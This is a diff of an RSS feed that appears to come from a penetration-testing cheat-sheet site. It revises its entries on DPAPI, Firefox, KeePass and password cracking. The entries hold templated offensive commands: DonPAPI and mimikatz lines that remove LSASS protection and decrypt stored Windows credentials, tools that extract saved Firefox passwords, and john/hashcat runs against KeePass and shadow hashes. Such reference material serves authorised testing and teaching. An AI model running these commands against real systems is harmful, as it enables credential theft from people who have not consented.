@@ -12,14 +12,14 @@
       <link>https://tldrbins.github.io/dpapi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dpapi/</guid>
-      <description>Abuse #1: Auto dump (From Linux) DonPAPI&#xA;DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -t &amp;lt;TARGET&amp;gt; Abuse #1: Auto dump (From Windows - mimikatz) 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; Abuse #1: Auto dump (From Windows - SharpDPAPI.</description>
+      <description>Abuse #1: Auto dump (From Linux) Linux DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -t &amp;lt;TARGET&amp;gt; Ref: DonPAPI&#xA;Abuse #1: Auto dump (From Windows) mimikatz SharpDPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; # Run as system .</description>
     </item>
     <item>
       <title>Firefox</title>
       <link>https://tldrbins.github.io/firefox/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/firefox/</guid>
-      <description> Extract saved passwords firefox_decrypt firefox_decrypt&#xA;# Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ firepwd firepwd&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py </description>
+      <description>Extract saved passwords firefox_decrypt firepwd # Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ Ref: firefox_decrypt&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py Ref: firepwd</description>
     </item>
     <item>
       <title>Hydra</title>
@@ -33,21 +33,21 @@
       <link>https://tldrbins.github.io/keepass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/keepass/</guid>
-      <description> Master password cracking keepass2john key.kdbx &amp;gt; hash # With a key file keepass2john -k key.png key.kdbx &amp;gt; hash kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 </description>
+      <description>Master password cracking keepass2john key.kdbx &amp;gt; hash # With a key file keepass2john -k key.png key.kdbx &amp;gt; hash kpcli # Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 # Export attachment (e.g. #0) attach 0 Ref: Download kpcli</description>
     </item>
     <item>
       <title>Password Cracking</title>
       <link>https://tldrbins.github.io/password_cracking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/password_cracking/</guid>
-      <description>john Convert file to john hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null Basic # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat Example Hashes</description>
+      <description>Convert file to hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null john hashcat # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.</description>
     </item>
     <item>
       <title>Shadow Hash Cracking</title>
       <link>https://tldrbins.github.io/shadow_hash_cracking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/shadow_hash_cracking/</guid>
-      <description> Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt john john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user </description>
+      <description> Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt john hashcat john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user </description>
     </item>
   </channel>
 </rss>
